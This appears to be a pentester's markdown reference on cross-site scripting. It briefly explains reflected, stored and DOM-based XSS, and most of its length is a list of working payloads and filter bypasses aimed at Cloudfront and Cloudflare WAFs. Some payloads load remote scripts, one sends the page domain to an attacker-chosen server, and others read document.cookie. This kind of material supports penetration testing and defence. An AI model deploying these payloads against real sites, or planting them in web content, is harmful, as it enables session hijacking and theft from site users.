# Cross Site Scripting (XSS)

**Cross-site scripting** works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim"s browser, the attacker can fully compromise their interaction with the application.



# Types of XSS Attacks

- Reflected XSS
- Stored XSS
- DOM-based XSS


## Reflected
This happens when the site receives data in a HTTP request and uses said data in the response in an unsafe way.
### Overview

1. Check if values that you control are being **reflected** in any **HTML** or **JS** code on the site
2.  Find the context where the value is reflected
### Example

```
https://remote.com?msg=helloworld

<h1>helloworld<h1/>
```

It can be seen that the value is being reflected in the response.

An attack would look like this

```
https://remote.com?msg=<script>alert("Hello")</script>
  
(A pop-up window would appear saying "Hello")

```


## Stored

In this type of XSS, the site receives unsafe data from a user and stores it.
This data can and most likely will be included in HTTP responses later.

### Example
Imagine a comment section. Any user can comment and `HTML` tags are allowed to be included in the comment.

There, a bad actor could include any `JS` code that will be executed anytime the page is requested.

```

COMMENT HERE: <script src="http://remote.com/mal.js"></script>

```

From here on out, whenever the page is accessed, the script will be loaded.
  

## DOM-based
[https://owasp.org/www-community/attacks/DOM_Based_XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)

XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

### Example

```js
let search = document.getElementById("search").value;
let results = document.getElementById("results");

results.innerHTML = "Result: " + search;
```

If the attacker controls the value of the input, they can add any malicious script they want.

```
Result: "malicious script here"
```



# List of XSS Filter Bypasses

## Cloudfront

```
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>

">'><details/open/ontoggle=confirm('XSS')>

6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/

&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
```

## Cloudflare

```
<a"/onclick=(confirm)()>Click Here!

Dec: <svg onload=prompt%26%230000000040document.domain)>

Hex: <svg onload=prompt%26%23x000000028;document.domain)>

xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>

<--%253cimg%20onerror=alert(1)%20src=a%253e --!>

<a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'>

javascript:{ alert`0` }

1'"><img/src/onerror=.1|alert``>

<img src=x onError=import('//1152848220/')>

%2sscript%2ualert()%2s/script%2u

<svg on onload=(alert)(document.domain)>

<img ignored=() src=x onerror=prompt(1)>

<svg onx=() onload=(confirm)(1)>

“><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

<svg on =i onload=alert(domain) (working)

<svg/onload=location/**/='https://your.server/'+document.domain>

<svg onx=() onload=window.alert?.()> (working)

test",prompt%0A/*HelloWorld*/(document.domain) (working)- @Brutelogic

"onx+%00+onpointerenter%3dalert(domain)+x" (working)- @Brutelogic

"><svg%20onload=alert%26%230000000040"1")> (working)- @IamRenganathan

%27%09);%0d%0a%09%09[1].find(alert)//

"><img src=1 onmouseleave=print()> - @itsgeekymonk

<svg on onload=(alert)(document.domain)> -@zapstiko

<svg/on%20onload=alert(1)> (working) -@aufzayed

<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> -@ex_m
```

## Template Injection

```
"><img src=x>${{8*2}}
```

## Misc

```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

'';!--"<XSS>=&{()}

0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"

<script/src=data:,alert()>

<marquee/onstart=alert()>

<video/poster/onerror=alert()>

<isindex/autofocus/onfocus=alert()>

<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>

<IMG SRC="javascript:alert('XSS');">

<IMG SRC=javascript:alert('XSS')>

<IMG SRC=JaVaScRiPt:alert('XSS')>

<IMG SRC=javascript:alert("XSS")>

<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>

<a onmouseover="alert(document.cookie)">xxs link</a>

<a onmouseover=alert(document.cookie)>xxs link</a>

<IMG """><SCRIPT>alert("XSS")</SCRIPT>">

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

<IMG SRC=# onmouseover="alert('xxs')">

<IMG SRC= onmouseover="alert('xxs')">

<IMG onmouseover="alert('xxs')">

<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;

&#39;&#88;&#83;&#83;&#39;&#41;>

<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&

#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>

<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

<IMG SRC="jav ascript:alert('XSS');">

<IMG SRC="jav&#x09;ascript:alert('XSS');">

<IMG SRC="jav&#x0A;ascript:alert('XSS');">

<IMG SRC="jav&#x0D;ascript:alert('XSS');">

<IMG SRC=" &#14; javascript:alert('XSS');">

<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<<SCRIPT>alert("XSS");//<</SCRIPT>

<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >

<SCRIPT SRC=//ha.ckers.org/.j>

<IMG SRC="javascript:alert('XSS')"

<iframe src=http://ha.ckers.org/scriptlet.html <

\";alert('XSS');//

</script><script>alert('XSS');</script>

</TITLE><SCRIPT>alert("XSS");</SCRIPT>

<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">

<BODY BACKGROUND="javascript:alert('XSS')">

<IMG DYNSRC="javascript:alert('XSS')">

<IMG LOWSRC="javascript:alert('XSS')">

<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>

<IMG SRC='vbscript:msgbox("XSS")'>

<IMG SRC="livescript:[code]">

<BODY ONLOAD=alert('XSS')>

<BGSOUND SRC="javascript:alert('XSS');">

<BR SIZE="&{alert('XSS')}">

<LINK REL="stylesheet" HREF="javascript:alert('XSS');">

<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">

<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>

<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">

<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>

<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>

<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">

exp/*<A STYLE='no\xss:noxss("*//*");

xss:ex/*XSS*//*/*/pression(alert("XSS"))'>

<STYLE TYPE="text/javascript">alert('XSS');</STYLE>

<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

<XSS STYLE="xss:expression(alert('XSS'))">

<XSS STYLE="behavior: url(xss.htc);">

¼script¾alert(¢XSS¢)¼/script¾

<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">

<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">

<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">

<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>

<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>

<TABLE BACKGROUND="javascript:alert('XSS')">

<TABLE><TD BACKGROUND="javascript:alert('XSS')">

<DIV STYLE="background-image: url(javascript:alert('XSS'))">

<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">

<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">

<DIV STYLE="width: expression(alert('XSS'));">

<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->

<BASE HREF="javascript:alert('XSS');//">

<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>

<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->

<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>

<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">

<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">

<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-

<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>

<A HREF="http://66.102.7.147/">XSS</A>

0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"

veris-->group<svg/onload=alert(/XSS/)//

#"><img src=M onerror=alert('XSS');>

element[attribute='<img src=x onerror=alert('XSS');>

[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]

%22;alert%28%27RVRSH3LL_XSS%29//

javascript:alert%281%29;

<w contenteditable id=x onfocus=alert()>

alert;pg("XSS")

<svg/onload=%26%23097lert%26lpar;1337)>

<script>for((i)in(self))eval(i)(1)</script>

<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>

<sCR<script>iPt>alert(1)</SCr</script>IPt>

<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
```



# References
- [https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)
- [https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt) -- *Bruteforce list*